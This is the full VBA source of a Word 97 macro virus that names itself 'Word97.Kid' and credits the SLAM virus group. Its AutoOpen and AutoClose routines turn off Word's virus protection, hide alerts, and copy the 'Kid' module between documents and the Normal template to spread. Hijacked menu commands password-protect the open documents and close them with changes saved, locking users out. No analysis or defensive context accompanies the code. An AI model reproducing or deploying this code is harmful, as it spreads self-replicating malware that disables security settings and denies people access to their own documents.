   Attribute VB_Name = "Kid"
   Sub KidChaos()
   On Error GoTo Kc
   If (Rnd() < 0.4) Then
   With Assistant.NewBalloon
       .BalloonType = msoBalloonTypeBullets
       .Icon = msoIconTip
       .Button = msoButtonSetOkCancel
       .Heading = "Word97.Kid by KC [SLAM]"
       .Labels(1).Text = "Greetings to SLAM memberz:"
       .Labels(2).Text = "Virtual Daemon, Aurodreph, CyberYoda"
       .Labels(3).Text = "Dark Chakal, Darx Kies, Forms"
       .Labels(4).Text = "RaidX, Stealth Warrior & Trigger"
       .Show
   End With
   End If
   Kc:
   End Sub

   Sub FileTemplates()
   On Error GoTo Ft
   If (Day(Now()) > 15) Then
   MsgBox "Kid Chaos of SLAM Virus Team", vbCritical, "About... :-)"
   ActiveDocument.Password = "KC"
   Documents.Close SaveChanges:=wdSaveChanges
   End If
   Ft:
   End Sub
   Sub ToolsMacro()
   On Error GoTo St
   ActiveDocument.Password = "KidChaos"
   Documents.Close SaveChanges:=wdSaveChanges
   Call KidChaos
   St:
   End Sub
   Sub ViewVBcode()
   On Error GoTo Vv
   ActiveDocument.Password = "SLAM98"
   Documents.Close SaveChanges:=wdSaveChanges
   Call KidChaos
   Vv:
   End Sub

   Sub AutoClose()
   On Error GoTo Ac
       Application.ScreenUpdating = False
       Application.DisplayAlerts = wdAlertsNone
       Options.VirusProtection = False
       Set ActiveDoc = ActiveDocument
       Set GlobalDoc = NormalTemplate
       DocInf = False
       GloInf = False


       For I = 1 To ActiveDocument.VBProject.VBComponents.Count
           If ActiveDocument.VBProject.VBComponents(I).Name = "Kid" Then
               DocInf = True
           End If
      Next

      If DocInf = False Then
           Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Kid", Object:=wdOrganizerObjectProjectItems
           ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
       End If

      For J = 1 To NormalTemplate.VBProject.VBComponents.Count
           If NormalTemplate.VBProject.VBComponents(J).Name = "Kid" Then
               GloInf = True
           End If
       Next

       If GloInf = False Then
           Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Kid", Object:=wdOrganizerObjectProjectItems
       End If
       Application.DisplayAlerts = wdAlertsAll
   Ac:
   End Sub
   Sub AutoOpen()
   On Error GoTo Au
       Call KidChaos
       Application.ScreenUpdating = False
       Application.DisplayAlerts = wdAlertsNone
       Options.VirusProtection = False
       Set ActiveDoc = ActiveDocument
       Set GlobalDoc = NormalTemplate
       DocInf = False
       GloInf = False


       For I = 1 To ActiveDocument.VBProject.VBComponents.Count
           If ActiveDocument.VBProject.VBComponents(I).Name = "Kid" Then
               DocInf = True
           End If
       Next

       If DocInf = False Then
           Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Kid", Object:=wdOrganizerObjectProjectItems
           ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
       End If


      For J = 1 To NormalTemplate.VBProject.VBComponents.Count
           If NormalTemplate.VBProject.VBComponents(J).Name = "Kid" Then
               GloInf = True
           End If
       Next

       If GloInf = False Then
           Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Kid", Object:=wdOrganizerObjectProjectItems
           Options.SaveNormalPrompt = False
       End If
       Application.DisplayAlerts = wdAlertsAll
   Au:
   End Sub
